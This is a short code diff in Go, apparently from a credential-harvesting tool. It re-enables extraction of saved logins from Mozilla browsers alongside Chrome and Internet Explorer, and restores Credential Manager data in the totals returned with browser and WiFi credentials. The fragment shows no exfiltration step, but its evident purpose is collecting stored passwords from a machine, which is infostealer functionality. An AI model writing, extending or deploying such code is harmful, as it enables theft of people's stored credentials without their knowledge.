@@ -15,11 +15,9 @@ func ExtractBrowserCredentials() ([]common.UrlNamePass, int) {
 		AllBrowsersData = append(AllBrowsersData, resultChrome.Data...)
 	}
 
-	/*
 	if resultMozilla := browsers.MozillaExtractDataRun(); resultMozilla.Success {
 		AllBrowsersData = append(AllBrowsersData, resultMozilla.Data...)
 	}
-	 */
 
 	if resultInternetExplorer := browsers.InternetExplorerExtractDataRun(); resultInternetExplorer.Success {
 		AllBrowsersData = append(AllBrowsersData, resultInternetExplorer.Data...)
@@ -90,8 +88,5 @@ func ExtractAllData() (AllDataStruct, int) {
 		outDataStruct.CredmanData = credmanData
 	}
 
-
-	//return outDataStruct, lengthCredmanData + lengthBrowserData + lengthWiFiData
-	return outDataStruct, lengthBrowserData + lengthWiFiData
-
+	return outDataStruct, lengthCredmanData + lengthBrowserData + lengthWiFiData
 }
